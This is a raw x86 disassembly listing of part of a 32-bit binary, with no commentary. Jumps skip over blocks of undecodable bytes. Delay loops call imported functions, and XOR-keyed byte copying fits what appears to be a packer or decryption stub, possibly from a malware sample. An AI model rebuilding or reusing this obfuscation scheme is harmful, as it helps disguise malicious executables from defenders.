  402889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40288a:	lods   eax,DWORD PTR ds:[esi]
  40288b:	mov    DWORD PTR [ecx],eax
  40288d:	jmp    0x4028b6
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax-0x1221fbaf]
  4028ec:	ss int3 
  4028ee:	clc    
  4028ef:	push   ebx
  4028f0:	or     BYTE PTR [esi+0x7e],bh
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x40289c
  4028f8:	inc    dx
  4028fa:	ss mov edi,0x469af809
  402900:	je     0x40291b
  402902:	adc    DWORD PTR [esi+eiz*8-0x62ce002d],ebp
  402909:	arpl   WORD PTR [esi+0x38],di
  40290c:	cli    
  40290d:	popa   
  40290e:	jmp    0x3a7fbaec
  402913:	push   0xe95f7858
  402918:	and    al,0x51
  40291a:	fnstcw WORD PTR [eax+esi*1]
  40291d:	sub    ebp,ecx
  40291f:	daa    
  402920:	hlt    
  402921:	adc    ebp,DWORD PTR [esi+0x27cb56e2]
  402927:	mov    ds:0x118e371b,eax
  40292c:	das    
  40292d:	jno    0x40297d
  40292f:	jmp    0x50cf:0x497fa50b
  402936:	lds    esp,FWORD PTR [ebp-0xa38ae42]
  40293c:	outs   dx,DWORD PTR ds:[esi]
  40293d:	and    al,0xa
  40293f:	xchg   esp,eax
  402940:	xchg   esp,eax
  402941:	out    0xc7,eax
  402943:	into   
  402944:	test   DWORD PTR [ebx],ecx
  402946:	mov    cs,esp
  402948:	aas    
  402949:	xbegin 0xa8f0f02f
  40294f:	js     0x40291a
  402951:	xchg   ebx,eax
  402952:	das    
  402953:	sbb    BYTE PTR [edx],0xe3
  402956:	adc    DWORD PTR [edi],edx
  402958:	stos   DWORD PTR es:[edi],eax
  402959:	outs   dx,BYTE PTR ds:[esi]
  40295a:	or     cl,BYTE PTR [eax+0x60ccf3dc]
  402960:	mov    ah,0x20
  402962:	jns    0x402994
  402964:	shl    DWORD PTR [ebp-0x425f72c5],cl
  40296a:	cmp    eax,0x5d7558e3
  40296f:	cwde   
  402970:	inc    edx
  402971:	xchg   edx,eax
  402972:	mov    eax,0x2c679ec5
  402977:	retf   
  402978:	aad    0x7c
  40297a:	imul   ebp,ebp,0xf904b86
  402980:	inc    ebx
  402981:	fwait
  402982:	add    bh,cl
  402984:	aas    
  402985:	mov    edi,0xca03d107
  40298a:	xchg   ebx,eax
  40298b:	inc    edi
  40298c:	xlat   BYTE PTR ds:[ebx]
  40298d:	fwait
  40298e:	push   esp
  40298f:	int3   
  402990:	leave  
  402991:	sub    DWORD PTR [esi+0x29fd760e],0xffffffd3
  402998:	mov    bh,0x92
  40299a:	or     BYTE PTR [ebp+0x226d6d61],0x7
  4029a1:	sar    DWORD PTR [ecx+0x43],1
  4029a4:	mov    WORD PTR [ebx-0x703157a2],gs
  4029aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029ab:	jmp    0x91b3:0xa267187b
  4029b2:	xchg   edx,eax
  4029b3:	bound  eax,QWORD PTR [esi]
  4029b5:	sub    al,0x2
  4029b7:	cld    
  4029b8:	inc    ecx
  4029b9:	mov    dl,0x52
  4029bb:	pop    ecx
  4029bc:	pop    ds
  4029bd:	jp     0x402977
  4029bf:	push   ds
  4029c0:	lods   eax,DWORD PTR ds:[esi]
  4029c1:	(bad)  
  4029c2:	retf   0x122e
  4029c5:	inc    bx
  4029c7:	inc    edi
  4029c8:	jb     0x402a42
  4029ca:	mov    esi,0x449895f2
  4029cf:	pusha  
  4029d0:	ret    0xca91
  4029d3:	and    eax,0xeb0bc924
  4029d8:	fisubr WORD PTR [edi+0x41]
  4029db:	or     DWORD PTR [ebx],eax
  4029dd:	mov    edi,0xc695ad33
  4029e2:	in     al,dx
  4029e3:	or     esp,DWORD PTR [esp+edx*8]
  4029e6:	mov    eax,0xb727fb4c
  4029eb:	mov    dl,BYTE PTR [eax+0x78]
  4029ee:	je     0x4029a0
  4029f0:	pop    esi
  4029f1:	or     BYTE PTR [eax-0x19581e12],al
  4029f7:	call   0xa864a1a3
  4029fc:	mov    ebp,esp
  4029fe:	mov    esp,edx
  402a00:	ret    0xe93b
  402a03:	ret    
  402a04:	jg     0x402993
  402a06:	scas   eax,DWORD PTR es:[edi]
  402a07:	inc    esi
  402a08:	push   0xffffff93
  402a0a:	test   BYTE PTR [esi],cl
  402a0c:	mov    ah,0x1e
  402a0e:	sub    DWORD PTR [ebp+0x74603db],edx
  402a14:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a16:	aaa    
  402a17:	push   ecx
  402a18:	and    DWORD PTR ds:0x434507,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434507
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434507,edx
  402a34:	cmp    DWORD PTR ds:0x434507,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434507,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x434463
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434507,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434507
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434507,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x43447f,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x4344bb,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x4344f7,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x4344f7
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x4344f7,ecx
  402aac:	cmp    DWORD PTR ds:0x4344f7,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x4344f7,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43458f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x43457b
  402ae8:	or     DWORD PTR ds:0x434547,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x434537,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x434543,0x434483
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b20:	mov    ds:0x973d6e8,eax
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b18
  402b2c:	sub    al,0x74
  402b2e:	dec    esp
  402b2f:	(bad)  
  402b30:	test   eax,0x1689f41f
  402b35:	xchg   DWORD PTR [eax],ecx
  402b37:	fisubr WORD PTR [eax]
  402b39:	or     al,0xda
  402b3b:	fidivr WORD PTR [edi]
  402b3d:	xchg   DWORD PTR [esi-0x7d],edx
  402b40:	dec    eax
  402b41:	adc    edx,0xffffff9f
  402b44:	scas   al,BYTE PTR es:[edi]
  402b45:	frstor [edi]
  402b47:	scas   eax,DWORD PTR es:[edi]
  402b48:	push   0x29
  402b4a:	fld    QWORD PTR [ecx-0x5d]
  402b4d:	xor    BYTE PTR ds:0xb690f49e,bh
  402b53:	aam    0xc1
  402b55:	sub    bh,cl
  402b57:	je     0x402b5f
  402b59:	mov    dh,0x7c
  402b5b:	lods   eax,DWORD PTR ds:[esi]
  402b5c:	lea    ebp,[eax-0x72]
  402b5f:	aad    0x5f
  402b61:	and    eax,0xc0dd70f2
  402b66:	jae    0x402b84
  402b68:	or     DWORD PTR [ecx+0x6b],ebp
  402b6b:	test   eax,0xc4ab6bae
  402b70:	mov    dl,BYTE PTR [ebp-0x50]
  402b73:	fcmovnb st,st(1)
  402b75:	pop    ebx
  402b76:	push   eax
  402b77:	xchg   ebx,eax
  402b78:	aam    0x1a
  402b7a:	mov    ebp,0xbb01db11
  402b7f:	mov    ch,0x8b
  402b81:	sub    ecx,DWORD PTR fs:[edi]
  402b84:	out    0xfd,al
  402b86:	rcr    edx,0x0
  402b89:	daa    
  402b8a:	int3   
  402b8b:	mov    edx,0x574e7d92
  402b90:	rol    DWORD PTR [edx-0x4c],cl
  402b93:	stc    
  402b94:	popa   
  402b95:	sti    
  402b96:	sbb    al,0xb8
  402b98:	shl    DWORD PTR [ecx-0x57],0xa6
  402b9c:	xchg   ebx,eax
  402b9d:	pop    eax
  402b9e:	das    
  402b9f:	xor    DWORD PTR [ecx+edx*1-0x62],esi
  402ba3:	jne    0x402c21
  402ba5:	xor    al,0x3
  402ba7:	mov    ds:0x79b8cad3,eax
  402bac:	aaa    
  402bad:	call   0x441b:0xc5cf7bd5
  402bb4:	(bad)  
  402bb5:	frstor [ebx+0x41d1ab1]
  402bbb:	jmp    0x5b5e0e07
  402bc0:	(bad)  
  402bc1:	addr16 sar ch,1
  402bc4:	and    ebp,DWORD PTR [edx+eiz*8]
  402bc7:	cs jb  0x402c3b
  402bca:	pop    ds
  402bcb:	dec    edx
  402bcc:	std    
  402bcd:	inc    ebx
  402bce:	adc    eax,0xc915fa4
  402bd3:	das    
  402bd4:	cdq    
  402bd5:	stos   DWORD PTR es:[edi],eax
  402bd6:	push   cs
  402bd7:	into   
  402bd8:	retf   0x587
  402bdb:	in     al,0xf7
  402bdd:	je     0x402bf5
  402bdf:	nop
  402be0:	ss pop ss
  402be2:	les    ebp,FWORD PTR [esi-0x68e9920a]
  402be8:	(bad)  
  402be9:	stc    
  402bea:	aam    0x4f
  402bec:	xchg   ecx,eax
  402bed:	ja     0x402c26
  402bef:	inc    esp
  402bf0:	(bad)  
  402bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf3:	ins    BYTE PTR es:[edi],dx
  402bf4:	mov    ds:0x2c770dd0,al
  402bf9:	jecxz  0x402be8
  402bfb:	imul   ebx,DWORD PTR [esi+0x59],0xce9cfbd5
  402c02:	cmp    DWORD PTR [eax-0x46e4fec4],edx
  402c08:	add    DWORD PTR [esi+0x2378493d],0x62
  402c0f:	sbb    BYTE PTR [esi-0x2dbcbbb7],ah
  402c15:	enter  0xbb8f,0x2a
  402c19:	retf   
  402c1a:	rcl    BYTE PTR [edi+0x22ac588c],0x4f
  402c21:	xchg   ebx,eax
  402c22:	mov    dh,0xcd
  402c24:	pop    esp
  402c25:	test   DWORD PTR [edx-0x25],0x761e499b
  402c2c:	cmp    ax,0xf201
  402c30:	mov    ds:0x7d0f55b3,al
  402c35:	push   ecx
  402c36:	das    
  402c37:	js     0x402c03
  402c39:	ins    BYTE PTR es:[edi],dx
  402c3a:	push   ebx
  402c3b:	sub    al,0x6f
  402c3d:	jl     0x402c34
  402c3f:	cmp    al,0xc1
  402c41:	pand   mm7,mm5
  402c44:	xchg   edi,eax
  402c45:	sub    dl,BYTE PTR [ebp+ebx*8+0x3f652b4]
  402c4c:	(bad)  
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434487,0x0
  402c5f:	mov    eax,ds:0x434487
  402c64:	inc    eax
  402c65:	mov    ds:0x434487,eax
  402c6a:	cmp    DWORD PTR ds:0x434487,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434487,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x434467,0x434593
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	jl     0x402d2d
  402ce8:	mov    esi,0x7e0b135a
  402ced:	jle    0x402d0d
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402d1d
  402cf3:	ds and esi,ecx
  402cf6:	cmc    
  402cf7:	inc    edx
  402cf8:	jmp    0x77cb:0x38915db
  402cff:	stos   BYTE PTR es:[edi],al
  402d00:	shr    BYTE PTR [ebp-0xa590a1c],cl
  402d06:	cmp    ch,ah
  402d08:	loopne 0x402c91
  402d0a:	sbb    DWORD PTR [ecx],edi
  402d0c:	mov    ecx,0x905d36bd
  402d11:	sbb    eax,0x48f432c5
  402d16:	loope  0x402cfb
  402d18:	adc    cl,BYTE PTR [ecx-0xfe12029]
  402d1e:	gs xchg dx,ax
  402d21:	mov    ebx,0xacc97ca
  402d26:	loope  0x402d1b
  402d28:	nop
  402d29:	and    eax,0x8c926adc
  402d2e:	fsubr  DWORD PTR [ebp+ebx*2-0x11]
  402d32:	into   
  402d33:	test   eax,0x628cafee
  402d38:	sbb    bh,BYTE PTR [edx-0x2e]
  402d3b:	fidivr WORD PTR [ebx-0x5c]
  402d3e:	sbb    ecx,edi
  402d40:	jmp    0xf0ee:0x6c8bc267
  402d47:	mov    DWORD PTR [edi],esi
  402d49:	push   ebx
  402d4a:	mov    al,0x1a
  402d4c:	and    al,0x76
  402d4e:	loope  0x402d0e
  402d50:	retf   0xc651
  402d53:	mov    cl,0x34
  402d55:	xchg   edx,eax
  402d56:	fild   QWORD PTR [edx]
  402d58:	push   0x12
  402d5a:	hlt    
  402d5b:	mov    al,ds:0x129af4ae
  402d60:	gs jne 0x402d61
  402d63:	pop    esp
  402d64:	ins    DWORD PTR es:[edi],dx
  402d65:	fs (bad) 
  402d67:	cmp    esp,DWORD PTR [ebx-0x2c1b9bdb]
  402d6d:	cld    
  402d6e:	inc    edi
  402d6f:	dec    esi
  402d70:	sti    
  402d71:	jp     0x402d4c
  402d73:	das    
  402d74:	push   ss
  402d75:	mov    ah,0xb3
  402d77:	(bad)  
  402d78:	jo     0x402d2b
  402d7a:	sub    ah,BYTE PTR [edx+ebp*4+0x3bdfe817]
  402d81:	les    esi,FWORD PTR [edx-0x76]
  402d84:	ror    BYTE PTR ds:0x4366ac1b,1
  402d8a:	or     eax,ebp
  402d8c:	imul   eax,DWORD PTR [esi+0x4d],0xba9477f5
  402d93:	cld    
  402d94:	inc    esp
  402d95:	jb     0x402d5d
  402d97:	stc    
  402d98:	sub    eax,0xb6f83613
  402d9d:	stos   DWORD PTR es:[edi],eax
  402d9e:	cmp    cl,dl
  402da0:	sub    al,0x1e
  402da2:	arpl   WORD PTR ds:0x15828972,sp
  402da8:	pop    es
  402da9:	pop    ebp
  402daa:	shl    BYTE PTR [ebp-0x7c4b0514],1
  402db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db1:	inc    edx
  402db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db3:	cmp    BYTE PTR [esi-0x1a],0xa3
  402db7:	lods   al,BYTE PTR ds:[esi]
  402db8:	pushf  
  402db9:	sbb    DWORD PTR [ebp-0x68],edi
  402dbc:	or     DWORD PTR [edi+eiz*4-0x7c354c14],edx
  402dc3:	aas    
  402dc4:	mov    esi,0x9c465d34
  402dc9:	cwde   
  402dca:	rcl    DWORD PTR [edi+edi*2+0x47],1
  402dce:	(bad)  
  402dd0:	or     BYTE PTR [eax-0x6e],al
  402dd3:	xor    ebx,edx
  402dd5:	nop
  402dd6:	inc    eax
  402dd7:	dec    eax
  402dd8:	mov    eax,0xc601af77
  402ddd:	and    al,0xed
  402ddf:	cmp    DWORD PTR [esi],eax
  402de1:	xor    BYTE PTR [esi-0x15086af6],ch
  402de7:	jp     0x402e64
  402de9:	or     al,0x98
  402deb:	cmc    
  402dec:	test   DWORD PTR [ebx+0x28ce1ad7],edx
  402df2:	dec    edi
  402df3:	jg     0x402dfa
  402df5:	jnp    0x402dda
  402df7:	push   eax
  402df8:	push   ds
  402df9:	add    DWORD PTR [eax+0x25],ecx
  402dfc:	add    eax,0xcfe7722e
  402e01:	push   ecx
  402e02:	pop    esp
  402e03:	pop    ebx
  402e04:	inc    edi
  402e05:	xor    dl,BYTE PTR ds:[eax+0x9]
  402e09:	push   esp
  402e0a:	sub    edx,DWORD PTR [ecx-0x174f106e]
  402e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e11:	bound  ecx,QWORD PTR [ebx-0x3eccf3a3]
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x4344f7,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    cl,bh
  402e93:	les    esi,FWORD PTR [ebx-0x7c]
  402e96:	xor    edx,DWORD PTR [esi+edi*2]
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402ef7
  402e9f:	stc    
  402ea0:	nop    DWORD PTR [ebx-0x49]
  402ea4:	pop    ss
  402ea5:	pop    ds
  402ea6:	out    dx,eax
  402ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ea8:	out    dx,eax
  402ea9:	in     al,dx
  402eaa:	mov    ah,0xc3
  402eac:	and    BYTE PTR [esi+0x7c],ah
  402eaf:	and    DWORD PTR [edi+0x3e],ecx
  402eb2:	xchg   edx,eax
  402eb3:	dec    edx
  402eb4:	enter  0xaf7b,0x16
  402eb8:	add    DWORD PTR [edx-0x22],edx
  402ebb:	shl    DWORD PTR [esi+0x2d],0x60
  402ebf:	aaa    
  402ec0:	cmp    al,0x41
  402ec2:	ror    BYTE PTR [edx+0x9],cl
  402ec5:	xchg   esp,eax
  402ec6:	mov    esp,eax
  402ec8:	mov    dl,0x87
  402eca:	xor    edi,esp
  402ecc:	or     BYTE PTR [esi-0x7d8972d9],al
  402ed2:	mov    bh,0x47
  402ed4:	out    0xdb,eax
  402ed6:	mov    eax,0xa61ae498
  402edb:	cmp    dh,BYTE PTR ds:0x6804930
  402ee1:	jae    0x402e9d
  402ee3:	mov    ds:0x823fe5e3,al
  402ee8:	les    edx,FWORD PTR [edi+0x14]
  402eeb:	retf   
  402eec:	inc    ebx
  402eed:	cmp    eax,0xe4c211ec
  402ef2:	sbb    al,0xdb
  402ef4:	aas    
  402ef5:	loop   0x402f48
  402ef7:	mov    ah,0x45
  402ef9:	dec    ebx
  402efa:	adc    al,0x3f
  402efc:	es dec ebx
  402efe:	dec    esp
  402eff:	mov    ebx,0x1f533ecf
  402f04:	sbb    eax,0x4606125b
  402f09:	xchg   edx,eax
  402f0a:	sbb    bl,BYTE PTR [ebx-0x78]
  402f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f0e:	jmp    FWORD PTR [esi+0x190dd02b]
  402f14:	push   ss
  402f15:	aam    0xc2
  402f17:	div    DWORD PTR [ebx+0x178a88b]
  402f1d:	cmp    ebx,DWORD PTR [ebx-0x3e0a667d]
  402f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f24:	or     eax,0xff47d7f2
  402f29:	fucomi st,st(7)
  402f2b:	xchg   esi,eax
  402f2c:	pop    ebp
  402f2d:	pusha  
  402f2e:	fwait
  402f2f:	mov    ds:0x60f05614,eax
  402f34:	enter  0x83d8,0x77
  402f38:	stos   DWORD PTR es:[edi],eax
  402f39:	clc    
  402f3a:	mov    ebp,0xcf3ccf7f
  402f3f:	repz jecxz 0x402ee9
  402f42:	rcr    DWORD PTR [eax-0x3a],0xe
  402f46:	rol    BYTE PTR [ecx],0xec
  402f49:	mov    eax,0x91a3c029
  402f4e:	lods   eax,DWORD PTR ds:[esi]
  402f4f:	iret   
  402f50:	rcl    BYTE PTR [edx+0x73],1
  402f53:	cmp    al,0xed
  402f55:	adc    eax,0xacfc8aed
  402f5a:	aas    
  402f5b:	cmp    DWORD PTR [esi-0x46],ecx
  402f5e:	jo     0x402f8e
  402f60:	push   0x75
  402f62:	jno    0x402f48
  402f64:	shl    BYTE PTR [esi-0xbfd32af],0x16
  402f6b:	cdq    
  402f6c:	mov    al,ds:0x5665ecf5
  402f71:	pop    ss
  402f72:	aas    
  402f73:	outs   dx,BYTE PTR ds:[esi]
  402f74:	mov    eax,ds:0x4462dda6
  402f79:	out    dx,al
  402f7a:	(bad)  
  402f7b:	mov    esi,0x27f4ba8
  402f80:	and    cl,BYTE PTR [ebx]
  402f82:	adc    eax,DWORD PTR [eax-0x5dcf5ad6]
  402f88:	es push ebp
  402f8a:	xchg   ecx,eax
  402f8b:	push   ds
  402f8c:	sbb    DWORD PTR [ebp-0x752d21e2],edi
  402f92:	sub    ch,BYTE PTR [edi]
  402f94:	mov    eax,0xb671981f
  402f99:	mov    esi,0xf2f66959
  402f9e:	inc    ebx
  402f9f:	adc    BYTE PTR [edi-0x4ea16290],dh
  402fa5:	dec    ecx
  402fa6:	int    0x3e
  402fa8:	adc    esi,edi
  402faa:	inc    ebp
  402fab:	mov    al,0x8b
  402fad:	je     0x402f97
  402faf:	xor    eax,0x50176e6e
  402fb4:	cmp    eax,0xd05db3b2
  402fb9:	push   ecx
  402fba:	and    al,0x8e
  402fbc:	retf   
  402fbd:	pop    edi
  402fbe:	jns    0x402fb7
  402fc0:	adc    DWORD PTR [ecx],0x684aa711
  402fc6:	sub    esi,0xffffffaf
  402fc9:	jecxz  0x402fc9
  402fcb:	daa    
  402fcc:	inc    ecx
  402fcd:	outs   dx,BYTE PTR ds:[esi]
  402fce:	outs   dx,BYTE PTR ds:[esi]
  402fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fd0:	xchg   ebp,eax
  402fd1:	cld    
  402fd2:	jmp    DWORD PTR [eax]
  402fd4:	mov    ds:0xd42f71a8,eax
  402fd9:	mov    eax,ds:0x6d6fbbab
  402fde:	(bad)  
  402fdf:	loopne 0x402f65
  402fe1:	pop    es
  402fe2:	adc    eax,0x5bce5164
  402fe7:	imul   ebx,DWORD PTR [eax-0x44],0x3
  402feb:	xchg   ebp,eax
  402fec:	int    0x7a
  402fee:	ret    
  402fef:	cmc    
  402ff0:	outs   dx,DWORD PTR ds:[esi]
  402ff1:	ror    ecx,0x17
  402ff4:	fwait
  402ff5:	sbb    dh,BYTE PTR [edi]
  402ff7:	fsub   QWORD PTR [edx+0x50f0ccfb]
  402ffd:	fdiv   st(7),st
  402fff:	push   edi
  403000:	out    0x40,al
  403002:	pop    edx
  403003:	inc    eax
  403004:	sub    DWORD PTR [esi+edi*8],esp
  403007:	enter  0xcf4c,0x32
  40300b:	pop    ebx
  40300c:	xchg   edx,eax
  40300d:	mov    esp,0x750e1b06
  403012:	adc    BYTE PTR [edi-0x2],ch
  403015:	cmp    BYTE PTR [edx],ch
  403017:	cmp    edi,DWORD PTR [ebp-0x631843ee]
  40301d:	ret    0xfe77
  403020:	sub    al,0xe8
  403022:	fidivr DWORD PTR [ebx-0x1]
  403025:	(bad)  
  403026:	je     0x402fcd
  403028:	pop    eax
  403029:	sti    
  40302a:	stc    
  40302b:	in     eax,0x34
  40302d:	(bad)  
  40302e:	sbb    edx,DWORD PTR [edi-0x75]
  403031:	je     0x402ff6
  403033:	sbb    al,0x87
  403035:	pop    edx
  403036:	fild   DWORD PTR [eax-0x1b]
  403039:	fs cdq 
  40303b:	mov    esp,0x57f49f1f
  403040:	dec    esp
  403041:	jo     0x402ff2
  403043:	or     dl,dh
  403045:	jne    0x40305f
  403047:	push   esp
  403048:	dec    ebp
  403049:	mov    ah,0x2b
  40304b:	fs call 0x68d7:0x223236eb
  403053:	out    dx,eax
  403054:	cmc    
  403055:	mov    esi,ebx
  403057:	xor    eax,0x3e7b2138
  40305c:	add    al,0xf9
  40305e:	leave  
  40305f:	inc    ecx
  403060:	retf   0xad66
  403063:	enter  0x2c73,0xb7
  403067:	into   
  403068:	and    al,0x41
  40306a:	sub    al,0x60
  40306c:	out    dx,al
  40306d:	repz loope 0x4030c4
  403070:	pop    ds
  403071:	inc    ebp
  403072:	and    BYTE PTR [esi+0x4248d4ff],bh
  403078:	inc    ecx
  403079:	cmp    ah,dh
  40307b:	iret   
  40307c:	dec    edi
  40307d:	mov    bh,0x4e
  40307f:	mov    bh,BYTE PTR [ecx]
  403081:	jg     0x4030c1
  403083:	inc    edx
  403084:	loope  0x40306f
  403086:	aad    0xeb
  403088:	xchg   ecx,eax
  403089:	pop    ds
  40308a:	sbb    cl,bh
  40308c:	jno    0x4030b3
  40308e:	pop    es
  40308f:	mov    esi,?
  403091:	dec    eax
  403092:	leave  
  403093:	jle    0x403061
  403095:	sahf   
  403096:	inc    ebp
  403097:	test   bl,bh
  403099:	out    0xd3,al
  40309b:	cmp    edx,eax
  40309d:	imul   eax,eax,0x1f07fefc
  4030a3:	mov    edx,0xf7b4cbf5
  4030a8:	sbb    eax,DWORD PTR [esi]
  4030aa:	add    BYTE PTR [ecx],0xbd
  4030ad:	mov    ah,0xa0
  4030af:	or     ebx,DWORD PTR [eax]
  4030b1:	cmp    al,0xe4
  4030b3:	jg     0x40312c
  4030b5:	outs   dx,DWORD PTR ds:[esi]
  4030b6:	sti    
  4030b7:	(bad)  
  4030b8:	mov    ch,0xb2
  4030ba:	cmp    al,0x21
  4030bc:	mov    ch,BYTE PTR [eax]
  4030be:	lock in al,0x6b
  4030c1:	sbb    DWORD PTR [ebx],ebp
  4030c3:	neg    BYTE PTR [ecx-0x6b]
  4030c6:	in     al,dx
  4030c7:	call   0x1c3e:0x767cc18e
  4030ce:	cdq    
  4030cf:	jns    0x4030d1
  4030d1:	sbb    al,BYTE PTR [ebp-0x54]
  4030d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030d5:	adc    bl,BYTE PTR [edx+0x56]
  4030d8:	inc    eax
  4030d9:	int3   
  4030da:	or     edx,edi
  4030dc:	lods   eax,DWORD PTR ds:[esi]
  4030dd:	jns    0x403121
  4030df:	(bad)
  4030e2:	and    eax,0xc27daa4f
